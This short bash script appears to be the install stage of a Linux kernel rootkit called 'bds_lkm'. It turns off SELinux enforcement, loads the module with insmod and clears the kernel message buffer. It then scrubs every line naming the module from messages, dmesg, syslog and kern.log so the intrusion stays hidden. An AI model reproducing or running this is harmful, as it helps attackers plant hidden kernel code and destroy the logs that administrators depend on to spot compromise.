#!/bin/bash

fix_path() {
	path=$1
	cmd="mv /var/log/${path} /var/log/${path}.bak"
        #echo "cmd : $cmd"
	$cmd
	input="/var/log/$path.bak"
        echo "input: $input"
	while IFS= read -r line
	do
	if [[ "$line" == *"bds_lkm"* ]]
	then
            line=""
        else
           echo "$line" >> "/var/log/$path" 
	fi
	done < "$input"
        rm -f "/var/log/$path.bak"
}


sleep 25
setenforce 0
insmod /opt/bds_elf/bds_lkm.ko
nohup dmesg -c
rm -f nohup.out
fix_path messages
fix_path dmesg
fix_path syslog
fix_path kern.log
